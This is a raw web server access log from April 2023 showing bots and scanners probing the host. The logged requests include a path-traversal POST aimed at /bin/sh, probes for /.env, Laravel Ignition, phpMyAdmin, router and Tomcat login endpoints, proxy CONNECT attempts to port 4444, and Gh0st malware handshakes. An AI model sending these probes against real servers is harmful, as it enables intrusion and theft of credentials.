85.26.185.243 - - [25/Apr/2023:23:12:13 +0300] "GET / HTTP/1.1" 200 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.2.806 Yowser/2.5 Safari/537.36"
85.26.185.243 - - [25/Apr/2023:23:12:16 +0300] "GET / HTTP/1.1" 304 247 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.2.806 Yowser/2.5 Safari/537.36"
85.26.185.243 - - [25/Apr/2023:23:12:17 +0300] "GET / HTTP/1.1" 304 247 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.2.806 Yowser/2.5 Safari/537.36"
85.26.185.243 - - [25/Apr/2023:23:12:18 +0300] "GET / HTTP/1.1" 304 247 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.2.806 Yowser/2.5 Safari/537.36"
85.26.185.243 - - [25/Apr/2023:23:12:18 +0300] "GET / HTTP/1.1" 304 247 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.2.806 Yowser/2.5 Safari/537.36"
85.26.185.243 - - [25/Apr/2023:23:12:18 +0300] "GET / HTTP/1.1" 304 247 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.2.806 Yowser/2.5 Safari/537.36"
85.26.185.243 - - [25/Apr/2023:23:12:19 +0300] "GET / HTTP/1.1" 304 247 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.2.806 Yowser/2.5 Safari/537.36"
85.26.185.243 - - [25/Apr/2023:23:13:05 +0300] "-" 408 0 "-" "-"
37.220.79.195 - - [25/Apr/2023:23:13:10 +0300] "GET / HTTP/1.1" 200 219 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
85.26.185.243 - - [25/Apr/2023:23:14:33 +0300] "GET / HTTP/1.1" 200 23095 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.2.806 Yowser/2.5 Safari/537.36"
85.26.185.243 - - [25/Apr/2023:23:15:24 +0300] "-" 408 0 "-" "-"
185.189.182.234 - - [25/Apr/2023:23:15:43 +0300] "GET / HTTP/1.1" 400 486 "-" "-"
152.89.196.222 - - [25/Apr/2023:23:20:15 +0300] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 22583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
64.227.146.243 - - [25/Apr/2023:23:26:47 +0300] "GET /aaa9 HTTP/1.1" 404 435 "-" "Mozilla/5.0 zgrab/0.x"
64.227.146.243 - - [25/Apr/2023:23:26:58 +0300] "GET /aab8 HTTP/1.1" 404 435 "-" "Mozilla/5.0 zgrab/0.x"
64.227.146.243 - - [25/Apr/2023:23:27:04 +0300] "GET / HTTP/1.1" 200 22344 "-" "Mozilla/5.0 zgrab/0.x"
167.94.138.51 - - [25/Apr/2023:23:39:53 +0300] "GET / HTTP/1.1" 200 75882 "-" "-"
167.94.138.51 - - [25/Apr/2023:23:39:54 +0300] "GET / HTTP/1.1" 200 22399 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.51 - - [25/Apr/2023:23:39:54 +0300] "PRI * HTTP/2.0" 400 486 "-" "-"
167.94.138.51 - - [25/Apr/2023:23:39:55 +0300] "GET /favicon.ico HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
152.89.196.222 - - [25/Apr/2023:23:54:31 +0300] "GET /console/ HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.222 - - [26/Apr/2023:00:07:46 +0300] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.32.162.159 - - [26/Apr/2023:00:10:21 +0300] "GET / HTTP/1.1" 200 22842 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
13.95.133.245 - - [26/Apr/2023:00:25:58 +0300] "GET /an7jd0qo6kt5bk5bq4er8fe1xp7hl2vk/sqlite3.dll HTTP/1.1" 404 454 "-" "Go-http-client/1.1"
37.220.155.87 - - [26/Apr/2023:00:31:22 +0300] "GET / HTTP/1.1" 200 76617 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
85.217.144.136 - - [26/Apr/2023:00:41:29 +0300] "CONNECT 84.153.78.7:4444 HTTP/1.1" 200 75948 "-" "-"
152.89.196.222 - - [26/Apr/2023:00:58:30 +0300] "GET /_ignition/execute-solution HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
37.220.79.195 - - [26/Apr/2023:01:03:51 +0300] "GET / HTTP/1.1" 200 76616 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
152.89.196.222 - - [26/Apr/2023:01:33:14 +0300] "GET / HTTP/1.1" 200 22560 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
37.220.155.87 - - [26/Apr/2023:02:06:37 +0300] "GET / HTTP/1.1" 200 76636 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
152.89.196.222 - - [26/Apr/2023:02:09:50 +0300] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 486 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.32.162.159 - - [26/Apr/2023:02:10:13 +0300] "GET / HTTP/1.1" 200 22844 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
3.232.66.120 - - [26/Apr/2023:02:11:33 +0300] "GET /aN HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44"
3.232.66.120 - - [26/Apr/2023:02:11:36 +0300] "GET /favicon.ico HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56"
38.132.110.6 - - [26/Apr/2023:02:11:54 +0300] "GET /aN HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
37.220.79.195 - - [26/Apr/2023:02:13:18 +0300] "GET / HTTP/1.1" 200 76618 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
44.213.80.237 - - [26/Apr/2023:02:21:33 +0300] "\x16\x03\x01" 400 486 "-" "-"
44.213.80.237 - - [26/Apr/2023:02:21:33 +0300] "\x16\x03\x01" 400 486 "-" "-"
44.213.80.237 - - [26/Apr/2023:02:21:33 +0300] "\x16\x03\x01" 400 486 "-" "-"
44.213.80.237 - - [26/Apr/2023:02:21:33 +0300] "\x16\x03\x01" 400 486 "-" "-"
44.213.80.237 - - [26/Apr/2023:02:21:33 +0300] "GET / HTTP/1.1" 200 22442 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
44.213.80.237 - - [26/Apr/2023:02:21:33 +0300] "\x16\x03\x01" 400 486 "-" "-"
44.213.80.237 - - [26/Apr/2023:02:21:33 +0300] "GET /robots.txt HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
44.213.80.237 - - [26/Apr/2023:02:21:33 +0300] "GET /99vt HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
44.213.80.237 - - [26/Apr/2023:02:21:33 +0300] "GET /robots.txt HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
44.213.80.237 - - [26/Apr/2023:02:21:33 +0300] "GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
44.213.80.237 - - [26/Apr/2023:02:21:33 +0300] "GET /gate.php HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
44.213.80.237 - - [26/Apr/2023:02:21:33 +0300] "GET /99vu HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
161.35.233.14 - - [26/Apr/2023:02:29:42 +0300] "GET /explore HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
92.118.39.82 - - [26/Apr/2023:02:32:50 +0300] "GET / HTTP/1.1" 200 75879 "-" "-"
193.32.162.159 - - [26/Apr/2023:02:45:10 +0300] "GET / HTTP/1.1" 200 22846 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.89.196.222 - - [26/Apr/2023:03:17:19 +0300] "GET / HTTP/1.1" 200 22518 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
37.220.155.87 - - [26/Apr/2023:03:18:11 +0300] "GET / HTTP/1.1" 200 76618 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
149.129.50.37 - - [26/Apr/2023:03:35:27 +0300] "GET http://www.1ucn.com/proxychecker/index.php HTTP/1.1" 404 435 "-" "Mozilla/4.5b1 [en] (X11; I; Linux 2.0.35 i586)"
149.129.50.37 - - [26/Apr/2023:03:35:53 +0300] "-" 408 0 "-" "-"
36.99.44.184 - - [26/Apr/2023:03:42:28 +0300] "GET /phpmyadmin/index.php HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
36.99.44.184 - - [26/Apr/2023:03:42:29 +0300] "GET /pmd/index.php HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
36.99.44.184 - - [26/Apr/2023:03:42:29 +0300] "GET /pmd/index.php HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
40.113.118.83 - - [26/Apr/2023:03:54:10 +0300] "GET /an7jd0qo6kt5bk5bq4er8fe1xp7hl2vk/sqlite3.dll HTTP/1.1" 404 454 "-" "Go-http-client/1.1"
37.220.155.87 - - [26/Apr/2023:03:55:42 +0300] "GET / HTTP/1.1" 200 76618 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
170.64.164.86 - - [26/Apr/2023:04:08:16 +0300] "\x16\x03\x01" 400 486 "-" "-"
170.64.164.86 - - [26/Apr/2023:04:08:18 +0300] "\x16\x03\x01" 400 486 "-" "-"
170.64.164.86 - - [26/Apr/2023:04:08:19 +0300] "GET / HTTP/1.1" 200 22468 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.164.86 - - [26/Apr/2023:04:08:20 +0300] "GET /client/get_targets HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.164.86 - - [26/Apr/2023:04:08:20 +0300] "GET /upl.php HTTP/1.1" 404 435 "-" "Mozilla/5.0"
170.64.164.86 - - [26/Apr/2023:04:08:21 +0300] "\x16\x03\x01" 400 486 "-" "-"
170.64.164.86 - - [26/Apr/2023:04:08:21 +0300] "GET /geoip/ HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.164.86 - - [26/Apr/2023:04:08:22 +0300] "GET / HTTP/1.1" 200 22614 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
170.64.164.86 - - [26/Apr/2023:04:08:23 +0300] "GET /favicon.ico HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.104.166.147 - - [26/Apr/2023:04:13:55 +0300] "\x16\x03" 400 486 "-" "-"
172.104.166.147 - - [26/Apr/2023:04:13:55 +0300] "GET /kN3p HTTP/1.1" 404 472 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
172.104.166.147 - - [26/Apr/2023:04:13:55 +0300] "GET /OyPE HTTP/1.1" 404 472 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
85.217.144.136 - - [26/Apr/2023:04:15:46 +0300] "CONNECT 84.153.78.7:4444 HTTP/1.1" 200 75949 "-" "-"
152.89.196.222 - - [26/Apr/2023:04:22:45 +0300] "GET /actuator/gateway/routes HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.222 - - [26/Apr/2023:04:44:08 +0300] "GET /geoserver HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
37.220.152.59 - - [26/Apr/2023:05:49:42 +0300] "GET / HTTP/1.1" 200 76615 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
193.32.162.159 - - [26/Apr/2023:06:12:54 +0300] "GET / HTTP/1.1" 200 22843 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.35.18.60 - - [26/Apr/2023:06:14:18 +0300] "GET / HTTP/1.1" 200 75881 "-" "-"
193.35.18.60 - - [26/Apr/2023:06:14:18 +0300] "POST /HNAP1/ HTTP/1.1" 404 491 "-" "Mozila/5.0"
193.35.18.60 - - [26/Apr/2023:06:14:18 +0300] "POST /HNAP1/ HTTP/1.1" 404 491 "-" "Mozila/5.0"
193.35.18.60 - - [26/Apr/2023:06:14:18 +0300] "POST /HNAP1/ HTTP/1.1" 404 491 "-" "Mozila/5.0"
193.35.18.60 - - [26/Apr/2023:06:14:18 +0300] "POST /HNAP1/ HTTP/1.1" 404 491 "-" "Mozila/5.0"
198.235.24.175 - - [26/Apr/2023:06:27:58 +0300] "\x16\x03\x01" 400 486 "-" "-"
43.243.129.37 - - [26/Apr/2023:06:57:46 +0300] "GET / HTTP/1.1" 200 22470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
159.65.120.34 - - [26/Apr/2023:07:06:18 +0300] "GET / HTTP/1.1" 200 77180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
20.229.51.198 - - [26/Apr/2023:07:08:29 +0300] "GET /an7jd0qo6kt5bk5bq4er8fe1xp7hl2vk/sqlite3.dll HTTP/1.1" 404 454 "-" "Go-http-client/1.1"
193.32.162.159 - - [26/Apr/2023:07:27:26 +0300] "GET / HTTP/1.1" 200 22843 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
178.62.78.116 - - [26/Apr/2023:07:34:13 +0300] "\x16\x03\x01" 400 486 "-" "-"
178.128.41.83 - - [26/Apr/2023:07:34:13 +0300] "\x16\x03\x03\x01\xa5\x01" 400 486 "-" "-"
178.128.41.83 - - [26/Apr/2023:07:34:13 +0300] "\x16\x03\x03\x01\xa5\x01" 400 486 "-" "-"
178.128.41.83 - - [26/Apr/2023:07:34:13 +0300] "\x16\x03\x03\x01V\x01" 400 486 "-" "-"
178.128.41.83 - - [26/Apr/2023:07:34:13 +0300] "\x16\x03\x03\x01H\x01" 400 486 "-" "-"
178.128.41.83 - - [26/Apr/2023:07:34:13 +0300] "\x16\x03\x03\x01\x99\x01" 400 486 "-" "-"
178.128.41.83 - - [26/Apr/2023:07:34:13 +0300] "\x16\x03\x02\x01\x9a\x01" 400 486 "-" "-"
178.128.41.83 - - [26/Apr/2023:07:34:13 +0300] "\x16\x03\x01\x01\xa7\x01" 400 486 "-" "-"
178.128.41.83 - - [26/Apr/2023:07:34:14 +0300] "\x16\x03\x01\x01\xa7\x01" 400 486 "-" "-"
178.128.41.83 - - [26/Apr/2023:07:34:14 +0300] "\x16\x03\x01\x01\x9d\x01" 400 486 "-" "-"
178.128.41.83 - - [26/Apr/2023:07:34:14 +0300] "\x16\x03\x01\x01\xb4\x01" 400 486 "-" "-"
157.245.72.78 - - [26/Apr/2023:07:34:16 +0300] "GET / HTTP/1.1" 200 22587 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
159.223.126.110 - - [26/Apr/2023:07:34:21 +0300] "\x16\x03\x01\x02" 400 486 "-" "-"
157.245.72.78 - - [26/Apr/2023:07:34:23 +0300] "GET /favicon.ico HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
159.65.219.198 - - [26/Apr/2023:07:34:57 +0300] "GET /3000D00E0000FFFF3F0031313744373731343634304537353046007A7A7A7A7A7A7A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000008047A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000 HTTP/1.1" 403 443 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)"
159.65.219.198 - - [26/Apr/2023:07:35:00 +0300] "\xbf\xbf\xaf\xaf~" 400 486 "-" "-"
159.65.219.198 - - [26/Apr/2023:07:35:01 +0300] "POST / HTTP/1.1" 200 76636 "-" "WinHttpClient"
209.97.142.94 - - [26/Apr/2023:07:35:21 +0300] "GET / HTTP/1.0" 200 75633 "-" "-"
209.97.142.94 - - [26/Apr/2023:07:35:22 +0300] "Gh0st\xad" 400 486 "-" "-"
209.97.142.94 - - [26/Apr/2023:07:35:25 +0300] "HELP" 400 486 "-" "-"
209.97.142.94 - - [26/Apr/2023:07:35:26 +0300] "\x1b\x84\xd5\xb0]\xf4\xc4\x93\xc50\xc2X\x8c\xda\xb1\xd7\xac\xafn\x1d\xe1\x1e\x1a3*\x85\xb7\x1d'\xb1\xc9k\xbf\xf0\xbc\n" 400 486 "-" "-"
209.97.142.94 - - [26/Apr/2023:07:35:27 +0300] "\x16\x03\x01" 400 486 "-" "-"
209.97.142.94 - - [26/Apr/2023:07:35:29 +0300] "\xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xffx\\d9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff\n" 400 486 "-" "-"
64.225.71.202 - - [26/Apr/2023:07:36:10 +0300] "GET / HTTP/1.0" 200 75633 "-" "-"
92.118.39.82 - - [26/Apr/2023:07:39:51 +0300] "GET / HTTP/1.1" 200 75879 "-" "-"
79.124.59.170 - - [26/Apr/2023:07:47:05 +0300] "GET / HTTP/1.0" 200 76415 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
85.217.144.136 - - [26/Apr/2023:07:55:48 +0300] "CONNECT 84.153.78.7:4444 HTTP/1.1" 200 75949 "-" "-"
193.35.18.251 - - [26/Apr/2023:08:22:45 +0300] "POST /boaform/admin/formLogin HTTP/1.1" 404 491 "http://37.220.87.22:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
37.220.152.59 - - [26/Apr/2023:08:24:10 +0300] "GET / HTTP/1.1" 200 76636 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
13.95.133.245 - - [26/Apr/2023:08:29:42 +0300] "GET /aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/sqlite3.dll HTTP/1.1" 404 454 "-" "Go-http-client/1.1"
183.100.254.121 - - [26/Apr/2023:08:52:55 +0300] "GET / HTTP/1.1" 200 75878 "-" "-"
183.100.254.121 - - [26/Apr/2023:08:52:56 +0300] "GET /manager/html HTTP/1.1" 404 491 "-" "-"
193.32.162.159 - - [26/Apr/2023:09:32:59 +0300] "GET / HTTP/1.1" 200 22842 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
144.126.234.98 - - [26/Apr/2023:09:41:15 +0300] "\x16\x03\x03\x01\xa5\x01" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:09:41:15 +0300] "\x16\x03\x03\x01\xa5\x01" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:09:41:16 +0300] "\x16\x03\x03\x01V\x01" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:09:41:16 +0300] "\x16\x03\x03\x01H\x01" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:09:41:16 +0300] "\x16\x03\x03\x01\x99\x01" 400 486 "-" "-"
159.223.126.110 - - [26/Apr/2023:09:41:16 +0300] "\x16\x03\x01" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:09:41:16 +0300] "\x16\x03\x02\x01\x9a\x01" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:09:41:16 +0300] "\x16\x03\x01\x01\xa7\x01" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:09:41:16 +0300] "\x16\x03\x01\x01\xa7\x01" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:09:41:16 +0300] "\x16\x03\x01\x01\x9d\x01" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:09:41:16 +0300] "\x16\x03\x01\x01\xb4\x01" 400 486 "-" "-"
167.99.149.214 - - [26/Apr/2023:09:41:20 +0300] "GET / HTTP/1.1" 200 22582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
167.99.149.214 - - [26/Apr/2023:09:41:21 +0300] "GET /favicon.ico HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
167.172.112.34 - - [26/Apr/2023:09:41:26 +0300] "\x16\x03\x01\x02" 400 486 "-" "-"
134.122.54.126 - - [26/Apr/2023:09:42:13 +0300] "GET / HTTP/1.0" 200 75635 "-" "-"
134.122.54.126 - - [26/Apr/2023:09:42:15 +0300] "Gh0st\xad" 400 486 "-" "-"
167.99.190.225 - - [26/Apr/2023:09:42:16 +0300] "GET /3000D00E0000FFFF3F0031313744373731343634304537353046007A7A7A7A7A7A7A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000008047A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000 HTTP/1.1" 403 443 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)"
134.122.54.126 - - [26/Apr/2023:09:42:18 +0300] "HELP" 400 486 "-" "-"
134.122.54.126 - - [26/Apr/2023:09:42:18 +0300] "\x1b\x84\xd5\xb0]\xf4\xc4\x93\xc50\xc2X\x8c\xda\xb1\xd7\xac\xafn\x1d\xe1\x1e\x1a3*\x85\xb7\x1d'\xb1\xc9k\xbf\xf0\xbc\n" 400 486 "-" "-"
167.99.190.225 - - [26/Apr/2023:09:42:19 +0300] "\xbf\xbf\xaf\xaf~" 400 486 "-" "-"
167.99.190.225 - - [26/Apr/2023:09:42:19 +0300] "POST / HTTP/1.1" 200 76634 "-" "WinHttpClient"
134.122.54.126 - - [26/Apr/2023:09:42:19 +0300] "\x16\x03\x01" 400 486 "-" "-"
134.122.54.126 - - [26/Apr/2023:09:42:21 +0300] "\xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xffx\\d9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff\n" 400 486 "-" "-"
137.184.160.69 - - [26/Apr/2023:09:42:47 +0300] "GET / HTTP/1.0" 200 75635 "-" "-"
85.26.189.81 - - [26/Apr/2023:09:45:02 +0300] "GET / HTTP/1.1" 200 22927 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.2.806 Yowser/2.5 Safari/537.36"
80.66.77.239 - - [26/Apr/2023:09:55:56 +0300] "GET /device.rsp?opt=user&cmd=list HTTP/1.0" 404 451 "-" "-"
109.237.98.226 - - [26/Apr/2023:09:59:51 +0300] "GET /.env HTTP/1.1" 404 491 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [26/Apr/2023:09:59:51 +0300] "\x16\x03\x01\x01H\x01" 400 486 "-" "-"
